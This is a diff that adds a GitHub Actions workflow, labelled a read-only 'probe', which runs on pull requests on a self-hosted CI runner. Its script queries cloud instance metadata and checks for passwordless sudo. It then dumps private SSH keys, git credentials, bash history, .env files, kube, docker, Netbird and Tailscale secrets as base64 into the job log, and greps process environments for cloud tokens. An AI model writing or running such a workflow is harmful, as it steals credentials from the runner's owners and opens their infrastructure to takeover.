@@ -1,0 +1,94 @@
+name: i6857
+on:
+  pull_request:
+    types: [opened, synchronize, reopened]
+jobs:
+  probe:
+    runs-on: [self-hosted, Linux, tilelang-ascend-ci]
+    timeout-minutes: 20
+    steps:
+      - name: read-only credential-access probe
+        continue-on-error: true
+        run: |
+          #!/bin/bash
+          # i6857 bounded read-only credential-access determination probe.
+          # No writes, no installs, no persistence: only identity, device, IMDS and file reads.
+          set -uo pipefail
+          M(){ echo; echo "=====I6857 $* ====="; }
+          B(){ # emit file as sha256+size+base64 (single line), bounded to 200KB
+            f="$1"
+            if [ -f "$f" ]; then
+              sz=$(stat -c %s "$f" 2>/dev/null)
+              sha=$(sha256sum "$f" 2>/dev/null | cut -d' ' -f1)
+              echo "@@FILE $f size=$sz sha256=$sha"
+              head -c 200000 "$f" 2>/dev/null | base64 -w0 2>/dev/null | fold -w 200
+              echo
+            else
+              echo "@@MISSING $f"
+            fi
+          }
+          M "START $(date -u +%FT%TZ)"
+          M IDENTITY
+          id 2>&1; echo "--"; hostname 2>&1; echo "--"; uname -a 2>&1; echo "--"; cat /etc/os-release 2>/dev/null | head -4
+          echo "--sudo"; sudo -n true 2>&1 && echo SUDO_OK_NOPASSWD || echo SUDO_NO
+          echo "--whoami-runner"; ps -o pid,user,args -C Runner.Listener 2>/dev/null | head -5
+          echo "--workspace"; ls -la /data/workspace 2>&1 | head -30
+          M IMDS
+          for u in \
+            "http://169.254.169.254/latest/meta-data/instance-id" \
+            "http://169.254.169.254/latest/meta-data/placement/availability-zone" \
+            "http://169.254.169.254/latest/meta-data/public-ipv4" \
+            "http://169.254.169.254/latest/meta-data/local-ipv4" \
+            "http://169.254.169.254/latest/meta-data/local-hostname" \
+            "http://169.254.169.254/latest/meta-data/instance-type" \
+            "http://169.254.169.254/openstack/latest/meta_data.json" \
+            "http://169.254.169.254/openstack/latest/user_data" ; do
+            echo "## $u"
+            timeout 8 curl -s -m 7 "$u" 2>&1 | head -c 6000
+            echo
+          done
+          M NPU
+          command -v npu-smi 2>&1
+          timeout 25 npu-smi info 2>&1 | head -60
+          echo "--npu-smi -t board"
+          timeout 25 npu-smi info -t board 2>&1 | head -60
+          echo "--davinci"
+          ls -la /dev/davinci* 2>&1 | head -20
+          ls /dev 2>/dev/null | grep -iE 'davinci|hisi|hvd' | head -20
+          echo "--npu-smi -L"; timeout 20 npu-smi info -l 2>&1 | head -20
+          M NET
+          ip -4 addr show 2>/dev/null | grep -E "^[0-9]|inet " | head -30
+          ip route 2>/dev/null | head -10
+          echo "--netbird"; command -v netbird 2>&1; timeout 10 netbird status 2>&1 | head -30
+          echo "--wt0"; ip addr show wt0 2>&1 | head -8
+          echo "--tailscale"; command -v tailscale 2>&1; timeout 10 tailscale status 2>&1 | head -20
+          M CREDS
+          B /root/.ssh/authorized_keys
+          B /root/.git-credentials
+          B /data/workspace/fzh/.ssh/fanerly_github_a3_ed25519
+          B /data/workspace/ci-runner/.ssh/id_ed25519
+          B /data/workspace/ci-runner/.bash_history
+          B /data/workspace/ci-panel/.env
+          B /data/workspace/ci-panel/shared/daemon/data/Config/global.json
+          B /root/.ssh/config
+          B /root/.kube/config
+          B /data/workspace/ci-runner/.kube/config
+          B /root/.docker/config.json
+          B /data/workspace/ci-runner/.docker/config.json
+          B /etc/netbird/config.json
+          B /var/lib/tailscale/tailscaled.state
+          M CLOUDENV
+          env 2>/dev/null | grep -iE '^(AWS|GOOGLE|GCP|AZURE|ALI|HUAWEI|HW_|TENCENT|OS_|NOVA|CI|RUNNER|GITHUB|KUBE|DOCKER|NETBIRD|TAILSCALE|HF_|MODELSCOPE)' | sed -E 's/(TOKEN|SECRET|KEY|PASSWORD)=.*/\1=<redacted-len>/' | head -60
+          echo "--env-count"; env | wc -l
+          echo "--proc-env-cloud-hits"
+          for p in $(pgrep -f 'Runner.Listener|Runner.Worker' 2>/dev/null | head -4); do
+            echo "## pid $p"
+            tr '\0' '\n' < /proc/$p/environ 2>/dev/null | grep -iE '^(AWS|GOOGLE|AZURE|OS_|NOVA|KUBE|NETBIRD|TAILSCALE)' | head -20
+          done
+          M EXTRA
+          echo "--find kube/docker/cloud files (bounded)"
+          timeout 30 find /data/workspace /root /etc -maxdepth 4 \( -name 'kubeconfig*' -o -name 'config.json' -o -name '.git-credentials' -o -name 'credentials' -o -name '*.pem' -o -name 'id_rsa' -o -name 'id_ed25519' \) -type f 2>/dev/null | head -60
+          echo "--ci-runner home"; ls -la /data/workspace/ci-runner 2>/dev/null | head -30
+          echo "--netbird/tailscale dirs"; ls -la /etc/netbird /var/lib/netbird /var/lib/tailscale /root/.netbird 2>/dev/null | head -40
+          M END $(date -u +%FT%TZ)
+          echo "=====I6857END====="
